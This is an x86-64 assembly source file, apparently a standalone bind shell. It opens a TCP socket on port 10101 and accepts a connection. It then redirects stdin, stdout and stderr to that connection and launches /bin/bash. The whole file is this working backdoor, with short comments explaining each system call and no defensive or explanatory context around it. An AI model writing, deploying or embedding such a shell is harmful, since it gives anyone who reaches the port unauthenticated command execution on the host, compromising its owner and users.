.include "defs.h"
.section .bss
	sin:
	sin_family:
		.word  0
	sin_port:    
		.word  0
	sin_addr: 
		.quad  0

.section .data

	user_port:
		.quad   10101
		

	sock:    
		.int 0
	fd: 
		.quad  0
	bash: 
		.string "/bin/bash"

.section .text
.global _start

_start:
	movq $SYS_SOCKET, %rax
	movq $AF_INET, %rdi
	movq $SOCK_STREAM, %rsi
	movq $IPPROTO_TCP, %rdx
	syscall	/* create socket */
	movq %rax, sock	/*	; retrieve socket */

  
	movw $AF_INET, sin_family
	movw user_port, %dx     
	xchgb %dh, %dl        
	movw %dx, sin_port   /* 	; getting a network (big-endian)-format port */

	movq $SYS_BIND, %rax /*	; binding created socket to address */
	movq sock, %rdi
	movq $sin, %rsi   
	movq $0x10, %rdx /* ; 16 bytes */
	syscall

	movq $SYS_LISTEN, %rax /*	; start listening for connection on port	*/
	movq  sock, %rdi 
	movq  $1, %rsi
	syscall

	movq $SYS_ACCEPT, %rax	/*; handling a connect*/
	movq  sock, %rdi
	movq  $0, %rsi
	movq  $0, %rdx
	syscall
	movq  %rax, fd		/*	; get a file desriptor of connection on port*/


/*	; DUP2 - duplicating file descriptors		*/
	movq $SYS_DUP2, %rax
	movq fd, %rdi
	movq $STDIN, %rsi
	syscall
	movq $SYS_DUP2, %rax
	movq fd, %rdi
	movq $STDOUT, %rsi
	syscall
	movq $SYS_DUP2, %rax
	movq fd, %rdi
	movq $STDERR, %rsi
	syscall

/*	;executing bash							*/
	movq $SYS_EXECVE, %rax
	movq $bash, %rdi
	movq $0,  %rsi
	movq $0,  %rdx
	syscall

	movq $SYS_EXIT, %rax
	movq $0, %rdi
	syscall
